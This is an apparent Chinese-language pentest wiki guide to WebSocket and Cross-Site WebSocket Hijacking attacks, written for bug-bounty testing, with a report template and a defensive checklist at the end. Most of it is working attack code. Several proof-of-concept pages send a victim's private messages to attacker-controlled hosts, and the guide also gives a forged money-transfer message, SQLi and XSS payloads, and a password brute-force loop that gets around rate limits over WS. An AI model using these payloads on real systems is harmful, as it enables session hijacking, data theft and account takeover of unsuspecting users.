---
type: wiki
category: attack
tool: burp,websocket-client,manual
status: active
last-updated: 2026-04-21
---

# WebSocket / CSWSH 攻擊指南（2026 版）

> **用途：** WebSocket 是 realtime 聊天、股票、遊戲、DevTools 常見；但很多 WS server 沒做 Origin check / auth check → CSWSH（Cross-Site WebSocket Hijacking）直接 hijack session。

## 0. 原理與關鍵差異

WebSocket 握手走 HTTP Upgrade：

```
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Origin: https://evil.com         ← browser 會帶，但 server 常不擋
Sec-WebSocket-Key: xxxxxx
Sec-WebSocket-Version: 13
Cookie: session=xxx              ← 跨站 cookie 自動帶（不被 CORS 擋）
```

**重點**：WS 不受 CORS 限制。若 server 沒驗 `Origin` header → **任何 evil.com 頁面都能用 victim 的 cookie 開 WS 連線 → CSWSH**。

## 1. 偵測

### 1.1 找 WS endpoint

```bash
# Burp / Caido traffic filter: WebSocket
# 或搜 HTML/JS
grep -r 'new WebSocket\|ws://\|wss://' static/

# 常見 path
/ws  /socket  /socket.io/  /graphql  /events  /live  /realtime
```

### 1.2 Origin check 測試（CSWSH 的關鍵）

```bash
# 用 wscat / websocat
brew install websocat
# or
npm i -g wscat

# 帶假 Origin
wscat -c 'wss://target.com/ws' -H "Origin: https://evil.com" -H "Cookie: session=<VICTIM>"

# 若連線成功 + 能收發訊息 → 沒擋 Origin → CSWSH
# 若 403 / close code 1008 → 有擋
```

### 1.3 Auth 測試

```bash
# 不帶 cookie / token
wscat -c wss://target.com/ws

# 若能連且收到即時資料 → unauth 可用
```

## 2. CSWSH PoC

### 2.1 基本 hijack（讀 victim data）

```html
<!-- evil.com/attack.html -->
<script>
const ws = new WebSocket('wss://target.com/ws');
ws.onopen = () => {
  // 已連 — victim session cookie 自動帶上
  ws.send(JSON.stringify({action:'subscribe',channel:'private:user'}));
};
ws.onmessage = (e) => {
  // 偷聽 victim 的 realtime 資料
  fetch('https://attacker/log', {method:'POST', body:e.data});
};
</script>
```

### 2.2 Send 動作（state-changing）

```javascript
ws.onopen = () => {
  ws.send(JSON.stringify({
    action: 'transfer',
    to: 'attacker@evil.com',
    amount: 1000
  }));
};
// 若 WS 直接執行 state-changing 且無 per-message 驗證 → CSRF via WS
```

### 2.3 Full interactive PoC（Burp-style）

```html
<!DOCTYPE html>
<html><body>
<script>
const ws = new WebSocket('wss://target.com/socket.io/?EIO=4&transport=websocket');
const log = (msg) => {
  fetch('https://attacker.com/log', {method:'POST', body: JSON.stringify({t:Date.now(),msg})});
};

ws.onopen = () => {
  log('connected');
  // 列出使用者收到的所有頻道訊息
  ws.send('40'); // socket.io connect
  ws.send('42["list_my_chats"]');
  ws.send('42["read_inbox"]');
};

ws.onmessage = (e) => log('recv:' + e.data);
ws.onerror = (e) => log('err:' + e);
ws.onclose = (e) => log('close:' + e.code);
</script>
</body></html>
```

## 3. WebSocket 獨有的漏洞面

### 3.1 訊息層 injection（SQLi / Cmd / XSS）

```javascript
// 每個 WS message 都是獨立 request，server 多半忘記做 input validation

ws.send(JSON.stringify({query: "1 OR 1=1--"}));
ws.send(JSON.stringify({nickname: "<img src=x onerror=alert(1)>"}));
```

Burp Repeater 可 intercept + modify WS messages（Pro 有 Repeater-for-WebSocket）。

### 3.2 Rate limit bypass

WS 多半沒做 per-message rate limit，而 HTTP endpoint 有。

```javascript
// HTTP 被擋 5 次 / 分鐘
// 切到 WS 送同樣命令可能無限量：
for(let i=0;i<10000;i++) ws.send(JSON.stringify({action:'login',user:'x',pass:'y'+i}));
```

### 3.3 Subscription IDOR

```
{"action":"subscribe","room":"user:123"}
# 改 user_id = 其他 user ID → 看到他的 realtime 訊息
```

### 3.4 GraphQL over WebSocket subscription

許多 GraphQL server 用 `graphql-ws` / `subscriptions-transport-ws`。

```javascript
ws.send(JSON.stringify({
  type: 'connection_init',
  payload: {Authorization: 'Bearer ...'}
}));
ws.send(JSON.stringify({
  id: '1',
  type: 'start',
  payload: {query: 'subscription { newMessage { user, text } }'}
}));
```

若 subscription resolver 沒做 auth → 任何連線都能訂閱 global event。

見 [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md)。

### 3.5 Token 傳在 WS URL query（洩漏在 log / referer）

```
wss://target.com/ws?token=JWT_HERE
```

Nginx access log / proxy log 會記錄 URL → token 洩漏。

### 3.6 `wss://` 降級為 `ws://`

中間人 / 公 WiFi 攻擊：若 client 接受 `ws://`，MITM 可介入。

## 4. 工具

### 4.1 wscat / websocat

```bash
wscat -c wss://target.com/ws -H "Cookie: session=xxx"
> {"action":"ping"}
< {"result":"pong"}

# websocat（更強）
websocat -E 'wss://target.com/ws' \
  -H='Cookie: session=xxx' \
  -H='Origin: https://evil.com'
```

### 4.2 Burp Suite

- Proxy → HTTP history 有 WebSocket tab
- Repeater → Create from WebSocket message
- Intruder 不支援 WS，要用 extension「WebSocket Turbo Intruder」

### 4.3 Caido

- 原生支援 WS intercept / replay

### 4.4 Nuclei WS 支援

```yaml
# template 範例
protocol: websocket
requests:
  - url: wss://{{Hostname}}/ws
    headers:
      Origin: https://evil.com
    input: '{"action":"ping"}'
    matchers:
      - type: word
        words: ['pong']
```

### 4.5 Apache JMeter / Artillery

壓測 + abuse:

```bash
npm i -g artillery
artillery quick --count 100 --num 10 "wss://target.com/ws"
```

## 5. 完整 PoC：CSWSH → Private message disclosure

### Step 1: 確認無 Origin check

```bash
websocat 'wss://target.com/ws' \
  -H='Origin: https://evil.com' \
  -H='Cookie: session=VICTIM_SESSION'
# 連上 → 收到 victim 的 private messages → CSWSH 存在
```

### Step 2: 構造 evil.com

```html
<!-- evil.com/poc.html -->
<script>
const ws = new WebSocket('wss://target.com/ws');
let messages = [];
ws.onmessage = (e) => {
  messages.push(e.data);
  if (messages.length >= 10) {
    fetch('https://attacker/exfil', {method:'POST', body: JSON.stringify(messages)});
  }
};
</script>
```

### Step 3: 發誘餌給 victim

```
Victim 登入 target.com（session cookie 設）
→ Victim 打開 evil.com/poc.html（同一 browser）
→ WS 自動帶 cookie 連到 target.com/ws
→ Victim 所有 private messages 被外洩給 attacker
```

### Step 4: 報告

```markdown
## 漏洞概述
wss://target.com/ws 未驗證 Origin header，允許 cross-origin JavaScript
使用 victim session cookie 建立 WebSocket 連線並接收 private channel 訊息。

## PoC
[evil.com HTML] + [attacker exfil log]

## Impact
- 任何登入 target.com 的使用者點到 attacker 連結 → private 訊息被即時竊取
- 若 WS 允許 send → state-changing CSRF via WS

## Severity
P2 / High

## 修補
1. 握手階段驗證 Origin header（白單）
2. 即使 Origin 合法也不要靠 session cookie 做 auth → 改用握手時 verify token
3. GraphQL subscription resolver 做 authz check
```

## 6. 防禦 checklist（寫修補建議用）

```
1. Server 驗 Origin header（白單 domain）
2. 握手後發 CSRF-like token 給 client，之後每筆 message 都要帶
3. 不靠 session cookie 做 auth → 改用 short-lived token
4. 每個 subscription / channel 做 per-request authz
5. Rate limit：per-connection + per-message
6. Input validation：每個 inbound message schema validate
7. 不要把 token 放 URL query
8. 只接受 wss://（HSTS + upgrade-insecure-requests）
9. CSP: connect-src 限制 WS endpoint
```

## 關聯文件

- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md) — GraphQL subscription over WS
- [65-csrf-deep.md](65-csrf-deep.md) — CSRF 基礎與 Origin 議題
- PortSwigger WebSocket：https://portswigger.net/web-security/websockets
- OWASP WebSocket Security：https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#websocket-implementation-hints
- websocat：https://github.com/vi/websocat
